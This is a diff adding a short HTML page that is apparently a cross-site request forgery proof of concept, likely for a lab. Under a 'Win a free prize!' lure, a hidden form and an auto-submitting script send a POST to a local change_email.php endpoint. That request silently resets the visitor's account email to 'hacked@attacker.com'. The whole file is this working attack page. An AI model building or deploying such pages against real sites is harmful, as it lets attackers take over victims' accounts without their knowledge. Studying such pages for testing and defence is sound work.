@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h3>Win a free prize! Loading...</h3>
+
+<form id="csrfForm" action="http://localhost:8000/change_email.php" method="POST">
+    <input type="hidden" name="email" value="hacked@attacker.com">
+</form>
+
+<script>
+document.getElementById("csrfForm").submit();
+</script>
+
+</body>
+</html>
